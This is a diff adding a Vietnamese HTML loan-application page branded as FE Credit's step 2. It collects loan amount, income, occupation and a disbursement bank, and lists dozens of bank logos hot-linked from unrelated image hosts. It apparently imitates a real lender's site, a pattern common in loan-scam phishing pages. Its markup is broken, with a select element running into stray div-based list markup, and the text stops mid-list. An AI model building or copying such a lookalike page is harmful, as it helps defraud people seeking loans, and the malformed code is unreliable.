@@ -1,0 +1,1246 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FE Credit - Bước 2: Thông tin khoản vay</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #00994F;
+            --text-color: #292929;
+            --bg-light: #f8f9fa;
+        }
+        body { font-family: 'Be Vietnam Pro', sans-serif; background-color: var(--bg-light); color: var(--text-color); }
+        
+        /* Header */
+        #site-header { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 10px 0; }
+        
+        /* Progress Steps */
+        .steps { display: flex; justify-content: space-between; margin: 30px auto; max-width: 800px; position: relative; padding: 0 15px; }
+        .step { flex: 1; text-align: center; font-size: 13px; font-weight: 600; color: #999; position: relative; z-index: 1; }
+        .step.active { color: var(--primary-color); }
+        .step.completed { color: var(--primary-color); }
+        .step.active::after { content: ''; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 100%; height: 3px; background: var(--primary-color); }
+        
+        /* Container */
+        .main-container { max-width: 800px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        
+        /* Form Elements */
+        .form-section-title { color: var(--primary-color); font-weight: 700; margin-bottom: 20px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .form-label { font-weight: 600; font-size: 14px; }
+        .form-control, .form-select { padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 15px; }
+        .form-control:focus, .form-select:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.1); }
+        .invalid-feedback { font-size: 12px; color: #dc3545; }
+        .form-control.is-invalid, .form-select.is-invalid { border-color: #dc3545; }
+        
+        /* Loan Calculator Box */
+        .loan-calc-box { background: #e8f5e9; padding: 20px; border-radius: 12px; margin-top: 20px; border: 1px solid #c8e6c9; }
+        .calc-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
+        .calc-row.total { font-weight: 700; color: var(--primary-color); font-size: 16px; border-top: 1px dashed #aaa; padding-top: 10px; margin-top: 10px; }
+        
+        /* Calculation Table */
+        .calculation-table { margin-top: 20px; width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; }
+        .calculation-table th, .calculation-table td { padding: 12px; text-align: center; border: 1px solid #ddd; }
+        .calculation-table th { background: var(--primary-color); color: #fff; font-weight: 600; }
+        .calculation-table tbody tr:nth-child(even) { background: #f8f9fa; }
+        .calculation-table tbody tr:hover { background: #e6f5e9; }
+        
+        /* Buttons */
+        .btn-next { width: 100%; background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 15px; font-weight: 700; border-radius: 10px; color: white; margin-top: 20px; }
+        .btn-next:hover { background: #007a3f; color: white; }
+        .btn-next:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
+        
+        /* Loading */
+        #loadingModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center; }
+        
+        /* Mobile responsive table */
+        @media (max-width: 767px) {
+            .calculation-table { display: block; font-size: 14px; }
+            .calculation-table thead { display: none; }
+            .calculation-table tbody { display: block; }
+            .calculation-table tbody tr { display: block; margin-bottom: 15px; padding: 15px; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+            .calculation-table tbody td { display: flex; justify-content: space-between; padding: 8px 0; border: none; border-bottom: 1px solid #f0f0f0; text-align: left; }
+            .calculation-table tbody td:last-child { border-bottom: none; }
+            .calculation-table tbody td:before { content: attr(data-label); font-weight: 600; color: var(--primary-color); margin-right: 10px; }
+        }
+
+        /* Custom Amount Input Group */
+        #customLoanAmountGroup { display: none; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <header id="site-header">
+        <div class="container">
+            <div id="logo" style="width: 150px;">
+                <a href="index.html"><img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT" style="width:100%"></a>
+            </div>
+        </div>
+    </header>
+
+    <div class="steps">
+        <div class="step completed">✓ THÔNG TIN</div>
+        <div class="step active">2. KHOẢN VAY</div>
+        <div class="step">3. XÁC THỰC</div>
+    </div>
+
+    <div class="container">
+        <div class="main-container">
+            <form id="loanForm" onsubmit="return false;">
+                
+                <h3 class="form-section-title"><i class="fas fa-coins me-2"></i>YÊU CẦU THÊM THÔNG TIN</h3>
+                
+                <div class="row g-3">
+                    <div class="col-md-6">
+                        <label class="form-label">Hình thức vay *</label>
+                        <select class="form-select" id="loanType" name="loanType" required>
+                            <option value="">Chọn hình thức vay</option>
+                            <option value="Vay tín chấp">Vay tín chấp</option>
+                            <option value="Vay thế chấp">Vay thế chấp</option>
+                            <option value="Vay mua nhà">Vay mua nhà</option>
+                            <option value="Vay mua xe">Vay mua xe</option>
+                            <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                            <option value="Vay trả góp">Vay trả góp</option>
+                        </select>
+                        <div class="invalid-feedback" id="loanTypeError">Vui lòng chọn hình thức vay</div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <label class="form-label">Số tiền muốn vay *</label>
+                        <select class="form-select" id="loanAmount" name="loanAmount" required>
+                            <option value="">Chọn số tiền</option>
+                            <option value="10000000">10.000.000 VNĐ</option>
+                            <option value="20000000">20.000.000 VNĐ</option>
+                            <option value="30000000">30.000.000 VNĐ</option>
+                            <option value="40000000">40.000.000 VNĐ</option>
+                            <option value="50000000">50.000.000 VNĐ</option>
+                            <option value="60000000">60.000.000 VNĐ</option>
+                            <option value="70000000">70.000.000 VNĐ</option>
+                            <option value="80000000">80.000.000 VNĐ</option>
+                            <option value="90000000">90.000.000 VNĐ</option>
+                            <option value="100000000">100.000.000 VNĐ</option>
+                            <option value="150000000">150.000.000 VNĐ</option>
+                            <option value="200000000">200.000.000 VNĐ</option>
+                            <option value="300000000">300.000.000 VNĐ</option>
+                            <option value="other">Khác</option>
+                        </select>
+                        <div class="invalid-feedback" id="loanAmountError">Vui lòng chọn số tiền vay</div>
+                    </div>
+
+                    <!-- Custom Loan Amount Input (shown when "Khác" is selected) -->
+                    <div class="col-12" id="customLoanAmountGroup">
+                        <label class="form-label">Nhập số tiền cụ thể *</label>
+                        <input type="text" class="form-control" id="customLoanAmount" name="customLoanAmount" placeholder="VD: 75,000,000">
+                        <small class="text-muted">Số tiền tối thiểu: 10.000.000 VNĐ</small>
+                        <div class="invalid-feedback" id="customLoanAmountError">Vui lòng nhập số tiền hợp lệ</div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <label class="form-label">Thời hạn vay *</label>
+                        <select class="form-select" id="loanTerm" name="loanTerm" required>
+                            <option value="">Chọn kỳ hạn</option>
+                            <option value="6">6 tháng</option>
+                            <option value="12">12 tháng</option>
+                            <option value="18">18 tháng</option>
+                            <option value="24">24 tháng</option>
+                            <option value="36">36 tháng</option>
+                            <option value="48">48 tháng</option>
+                            <option value="60">60 tháng</option>
+                        </select>
+                        <div class="invalid-feedback" id="loanTermError">Vui lòng chọn thời hạn vay</div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <label class="form-label">Lãi suất (%/năm) *</label>
+                        <input type="number" class="form-control" id="interestRate" name="interestRate" step="0.01" required readonly>
+                        <small class="text-muted">Lãi suất được tính tự động theo hình thức vay</small>
+                        <div class="invalid-feedback" id="interestRateError">Lãi suất không hợp lệ</div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <label class="form-label">Mục đích vay *</label>
+                        <select class="form-select" id="purpose" name="purpose" required>
+                            <option value="">Chọn mục đích</option>
+                            <option value="business">Kinh doanh</option>
+                            <option value="personal">Chi tiêu cá nhân</option>
+                            <option value="education">Học tập</option>
+                            <option value="medical">Y tế</option>
+                            <option value="home">Mua nhà/đất</option>
+                            <option value="vehicle">Mua xe</option>
+                            <option value="debt">Trả nợ</option>
+                            <option value="other">Mục đích khác</option>
+                        </select>
+                        <div class="invalid-feedback" id="purposeError">Vui lòng chọn mục đích vay</div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <label class="form-label">Thu nhập hàng tháng (VNĐ) *</label>
+                        <input type="text" class="form-control" id="monthlyIncome" name="monthlyIncome" placeholder="VD: 10,000,000" required>
+                        <div class="invalid-feedback" id="monthlyIncomeError">Thu nhập phải từ 3.000.000 VNĐ trở lên</div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <label class="form-label">Nghề nghiệp *</label>
+                        <select class="form-select" id="occupation" name="occupation" required>
+                            <option value="">Chọn nghề nghiệp</option>
+                            <option value="Kỹ sư">Kỹ sư</option>
+                            <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
+                            <option value="Giáo viên">Giáo viên</option>
+                            <option value="Bác sĩ">Bác sĩ</option>
+                            <option value="Kinh doanh">Kinh doanh</option>
+                            <option value="Công nhân">Công nhân</option>
+                            <option value="Hưu trí">Hưu trí</option>
+                            <option value="Khác">Khác</option>
+                        </select>
+                        <div class="invalid-feedback" id="occupationError">Vui lòng chọn nghề nghiệp</div>
+                    </div>
+                </div>
+
+                <div class="loan-calc-box">
+                    <h5 class="mb-3">Kết quả tính toán</h5>
+                    <div class="calc-row">
+                        <span>Số tiền vay:</span>
+                        <span class="fw-bold" id="calcLoanAmount">0 VNĐ</span>
+                    </div>
+                    <div class="calc-row">
+                        <span>Thanh toán hàng tháng:</span>
+                        <span class="fw-bold" id="calcMonthlyPayment">0 VNĐ</span>
+                    </div>
+                    <div class="calc-row">
+                        <span>Tổng lãi phải trả:</span>
+                        <span class="fw-bold" id="calcTotalInterest">0 VNĐ</span>
+                    </div>
+                    <div class="calc-row total">
+                        <span>Tổng gốc + lãi:</span>
+                        <span id="calcTotalAmount">0 VNĐ</span>
+                    </div>
+                    <small class="text-muted d-block mt-2 fst-italic">* Số liệu mang tính chất tham khảo, lãi suất thực tế phụ thuộc vào hồ sơ.</small>
+                </div>
+
+                <!-- Detailed Amortization Table -->
+                <div class="mt-4">
+                    <h5 class="mb-3 text-primary">Chi tiết thanh toán từng tháng</h5>
+                    <table class="calculation-table">
+                        <thead>
+                            <tr>
+                                <th>Tháng</th>
+                                <th>Gốc (đồng)</th>
+                                <th>Lãi (đồng)</th>
+                                <th>Tổng (đồng)</th>
+                                <th>Dư nợ (đồng)</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calculationTable">
+                            <!-- Rows will be populated by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="form-section-title mt-4"><i class="fas fa-university me-2"></i>TÀI KHOẢN GIẢI NGÂN</h3>
+                
+                <div class="row g-3">
+                    <div class="col-md-12">
+                        <label class="form-label">Ngân hàng thụ hưởng *</label>
+                        <select class="form-select" id="bankName" name="bankName" required>
+                                            <span>-- Chọn ngân hàng --</span>
+              </div>
+              <div class="custom-select-list">
+                <div class="custom-select-option" data-value="shinhan">
+                  <img
+                    src="https://storage.googleapis.com/housezy-2f8ee.appspot.com/images/entities/500/1694489220481.jpg"
+                    alt="Shinhan Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Shinhan (SHINHANBANK)
+                </div>
+                <div class="custom-select-option" data-value="vietcombank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSKfmg8stlijHEtnHcr6mzKL6-ZOakaHlxQ6Cl8uLaIJ7YaCA624VeA-Nxa8hJORjiN0Z4"
+                    alt="Vietcombank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Ngoại Thương (Vietcombank)
+                </div>
+                <div class="custom-select-option" data-value="vietinbank">
+                  <img
+                    src="https://i.pinimg.com/564x/0e/33/49/0e3349ab85ae5ebf604df3cb380f9c8f.jpg"
+                    alt="VietinBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Công Thương (VietinBank)
+                </div>
+                <div class="custom-select-option" data-value="bidv">
+                  <img
+                    src="https://play-lh.googleusercontent.com/g9KCglN_UhMUgccQxVg112tz3AAa0-ZqrgOkoKLtPe34-a6ZiOdzyW26hSWcqa-1sQ"
+                    alt="BIDV Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Đầu tư và Phát triển (BIDV)
+                </div>
+                <div class="custom-select-option" data-value="techcombank">
+                  <img
+                    src="https://techcombank.com/content/dam/techcombank/public-site/seo/techcombank_logo_svg_86201e50d1.svg"
+                    alt="Techcombank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Kỹ Thương (Techcombank)
+                </div>
+                <div class="custom-select-option" data-value="agribank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSu3s9LbPJqkaqT616sITYzyBYPaLHI2FzwDg&s"
+                    alt="Agribank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Nông nghiệp và Phát triển Nông thôn(Agribank)
+                </div>
+                <div class="custom-select-option" data-value="mbbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSXmD_3PBoPHofJkAQ49sZr82DFZLHmYN9cfHLwoVxtLhNHWnvXNCDGJitDaTEeZSImOSs"
+                    alt="MB Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Quân đội (MBBank)
+                </div>
+                <div class="custom-select-option" data-value="vpbank">
+                  <img
+                    src="https://yt3.googleusercontent.com/_uwwTxJP2A_IA_MwU5fkDIcsLOXW1SmqNKfAxJZmVudOwp29NuPlm69So0P7I0B3s78X-5syQQ=s900-c-k-c0x00ffffff-no-rj"
+                    alt="VPBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)
+                </div>
+                <div class="custom-select-option" data-value="vib">
+                  <img
+                    src="https://inkythuatso.com/uploads/thumbnails/800/2021/12/logo-vib-inkythuatso-3-21-13-44-34.jpg"
+                    alt="VIB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                 Ngân hàng Quốc tế Việt Nam (VIB)
+                </div>
+                <div class="custom-select-option" data-value="hdbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRhn0wDaZ9SXY0_LxW746TbKXgeFpJKkwxejd6jSi_6lHSrHSMogb1zYSIcynwmQK7dOeE"
+                    alt="HDBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                 Ngân hàng Phát triển TP.HCM (HDBank)
+                </div>
+                <div class="custom-select-option" data-value="ocb">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRPBeMuipMxfcuKFl2BM7WDU7UOYAVFEfVZc0yQHewLbg&s"
+                    alt="OCB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                 Ngân hàng Phương Đông (OCB)
+                </div>
+                <div class="custom-select-option" data-value="acb">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQW7j478Y5CAP5aulWNTxu8M46IjdgH5tVfww&s"
+                    alt="ACB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Á Châu (ACB)
+                </div>
+                <div class="custom-select-option" data-value="sacombank">
+                  <img
+                    src="https://play-lh.googleusercontent.com/UmnQk5GidbwIKmAKFFmrEPYjekyfB2gD_V1t2e-CDWGu_YlYDqpgs1moIsiouqEF=w240-h480-rw"
+                    alt="Sacombank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Sài Gòn Thương Tín (Sacombank)
+                </div>
+                <div class="custom-select-option" data-value="tpbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTL9Cpp1nDLbzIrK_-ljQsqJOGbytIiiDAgmQ&s"
+                    alt="TPBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Tiên Phong (TPBank)
+                </div>
+                <div class="custom-select-option" data-value="scb">
+                  <img
+                    src="https://play-lh.googleusercontent.com/z7gOit-6cq79jN3hcU-lquDoswKkIKjMYRWCpYKQ9yefkCCJBxn7DBIz0GFOmEg2mug=w600-h300-pc0xffffff-pd"
+                    alt="SCB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Sài Gòn (SCB)
+                </div>
+                <div class="custom-select-option" data-value="msb">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSUpmXz0eeUTJ_9uJFEp2fEy4tIWgNVN595yg&s"
+                    alt="MSB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Hàng Hải Việt Nam (MSB)
+                </div>
+                <div class="custom-select-option" data-value="eximbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRy7WS7U2alIs-4gBpq-NSCny-Hdm5StnvRbQ&s"
+                    alt="Eximbank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Xuất Nhập khẩu (Eximbank)
+                </div>
+                <div class="custom-select-option" data-value="seabank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQi3UoW6NuMUEtcuP_KiBOX4V-H7gvcxxzp2w&s"
+                    alt="SeABank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Đông Nam Á (SeABank)
+                </div>
+                <div class="custom-select-option" data-value="lienvietsong">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRMx4VEYNLmFxS-zRDU1RSGf1WLjjAooLdviw&s"
+                    alt="LienVietPostBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Bưu điện Liên Việt (LienVietPostBank)
+                </div>
+                <div class="custom-select-option" data-value="pvcombank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRejSFXwXKB4Jo5sxREyISfcwSYHCOJrbOqAA&s"
+                    alt="PVcomBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Đại chúng (PVcomBank)
+                </div>
+                <div class="custom-select-option" data-value="namabank">
+                  <img
+                    src="https://nhatrang-travel.com/upload/2001105/20200821/logo2_4efce.png"
+                    alt="Nam A Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Nam Á (Nam A Bank)
+                </div>
+                <div class="custom-select-option" data-value="shb">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRZAzuTTNf1p5s-eBhQ7k4xkgQEJqZ2SGVGXQ&s"
+                    alt="SHB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Sài Gòn - Hà Nội (SHB)
+                </div>
+                <div class="custom-select-option" data-value="kienlongbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSae4OzfCjQ84U5XlcVdEdIO4gEJUzsKtLgFg&s"
+                    alt="Kienlongbank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Kiên Long (Kienlongbank)
+                </div>
+                <div class="custom-select-option" data-value="baovietbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ1nFeuHEoRTFwHRc0_dvDuJ6wBRJgXd8c79A&s"
+                    alt="BaoViet Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Bảo Việt (BaoVietBank)
+                </div>
+                <div class="custom-select-option" data-value="pgbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkmbsBN4TVnl9vDjV336aiaTDqHz6QMf8pF3W6gtbNfw&s"
+                    alt="PGBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Xăng dầu Petrolimex (PGBank)
+                </div>
+                <div class="custom-select-option" data-value="vietbank">
+                  <img
+                    src="https://yt3.googleusercontent.com/MJFg375kZKRaEy1Sma9U0EcUWS0YsWYKPZAVvYoYtyoHZD83KraSyS-Pi4KICFh6-K8qG6nL5Ys=s900-c-k-c0x00ffffff-no-rj"
+                    alt="VietBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Việt Nam Thương Tín (VietBank)
+                </div>
+                <div class="custom-select-option" data-value="abbank">
+                  <img
+                    src="https://play-lh.googleusercontent.com/gasBPx3U0cPjfU6t2qkH-qk_An7WTd8I61jyXq6tlONBabC_fG90HjhhRz1-d8pTGJ8a"
+                    alt="ABBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng An Bình (ABBank)
+                </div>
+                <div class="custom-select-option" data-value="dbs">
+                  <img
+                    src="https://media-cdn-v2.laodong.vn/Storage/NewsPortal/2023/2/6/1144878/Logo-Ngan-Hang-Dbs-B.png"
+                    alt="DBS Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng DBS Bank Việt Nam (DBS)
+                </div>
+                <div class="custom-select-option" data-value="hsbc">
+                  <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png"
+                    alt="HSBC Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng HSBC Việt Nam (HSBC)
+                </div>
+                <div
+                  class="custom-select-option"
+                  data-value="standardchartered"
+                >
+                  <img
+                    src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/11/logo-sc_64d5f750369dd.jpg"
+                    alt="Standard Chartered Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Standard Chartered (StandardCharteredBank)
+                </div>
+                <div class="custom-select-option" data-value="uob">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTF13z7VJzPzrnjcAOO_m1O-ClWz0owEZ9MyQ&s"
+                    alt="UOB Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng United Overseas Bank (UOB)
+                </div>
+                <div class="custom-select-option" data-value="cimb">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSzfC0c93iQpxy2esdGztajlGJMuWoJVF2Kvw&s"
+                    alt="CIMB Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng CIMB (CIMB)
+                </div>
+                <div class="custom-select-option" data-value="publicbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRFCU8CUoBbMq-H0pSbmRwt1iSB4qqoSf86zA&s"
+                    alt="Public Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Public Bank (PublicBank)
+                </div>
+                <div class="custom-select-option" data-value="hongleongbank">
+                  <img
+                    src="https://play-lh.googleusercontent.com/xMbJaBvkQuvx6WLCvZlO9WYv59ZFE2877xnZFigi2rj5CMwtQfQKHZp0i-xXC5-H_bE"
+                    alt="Hong Leong Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Hong Leong (HongleongBank)
+                </div>
+                <div class="custom-select-option" data-value="wooribank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR8sNsrpQ4B_Z5eR2vSWcJXYZPXg280TX07_w&s"
+                    alt="Woori Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Woori (WooriBank)
+                </div>
+                <div class="custom-select-option" data-value="oceanbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRPUZ7PcFhkdcYgVQm6u7JPrCUzNgo1jgnSmw&s"
+                    alt="OceanBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Đại Dương (OceanBank)
+                </div>
+                <div class="custom-select-option" data-value="gpbank">
+                  <img
+                    src="https://static.ybox.vn/2022/4/1/1650273410233-nguyen14qbi9-avatar.png"
+                    alt="GPBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                   Ngân hàng Dầu khí Toàn cầu (GPBank)
+                </div>
+                <div class="custom-select-option" data-value="cbbank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4kGeSM3aasLxkcuu802o2JOzoPFeUte-3lA&s"
+                    alt="CBBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Xây dựng (CBBank)
+                </div>
+                <div class="custom-select-option" data-value="vbsp">
+                  <img
+                    src="https://play-lh.googleusercontent.com/XkaRbfpJt10EoVoAopfQoDlWNXvziTzRKg3S89FMFX8RGo3ur_RRb29P8Y_HF99IRbGa"
+                    alt="VBSP Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Chính sách xã hội (VBSP)
+                </div>
+                <div class="custom-select-option" data-value="vdb">
+                  <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_vdb.jpg"
+                    alt="VDB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Phát triển (VDB)
+                </div>
+                <div class="custom-select-option" data-value="coopbank">
+                  <img
+                    src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/2/coopbank_64ca2895d8a4f.png"
+                    alt="Co-op Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng HỢP TÁC XÃ VIỆT NAM (CoopBank)
+                </div>
+                <div class="custom-select-option" data-value="bacabank">
+                  <img
+                    src="https://finance.vietstock.vn/image/BAB"
+                    alt="Bac A Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Bắc Á (BacABank)
+                </div>
+                <div class="custom-select-option" data-value="ncb">
+                  <img
+                    src="https://images.careerviet.vn/employers_pro/154592/1720750094_154592_logo.png"
+                    alt="NCB Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Quốc Dân (NCB)
+                </div>
+                <div class="custom-select-option" data-value="saigonbank">
+                  <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Logo_SaigonBank.png"
+                    alt="Saigonbank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Sài Gòn Công Thương (Saigonbank)
+                </div>
+                <div class="custom-select-option" data-value="vietabank">
+                  <img
+                    src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/17/vietabank-logo_64de38af0f23f.jpg"
+                    alt="Viet A Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Viet A Bank (VietaBank)
+                </div>
+                <div class="custom-select-option" data-value="vietcapitalbank">
+                  <img
+                    src="https://finance.vietstock.vn/image/BVB"
+                    alt="Viet Capital Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Viet Capital Bank (VietcapitalBank)
+                </div>
+                <div class="custom-select-option" data-value="vikkibank">
+                  <img
+                    src="https://finance.vietstock.vn/image/VikkiBankS"
+                    alt="Vikki Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Ngân hàng Số Vikki (Vikki Bank)
+                </div>
+                <div class="custom-select-option" data-value="lpbank">
+                  <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/2/22/Logo-chinh-thuc-Ngan-hang-Loc-Phat-Viet-Nam-1024x379.png"
+                    alt="LPBank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
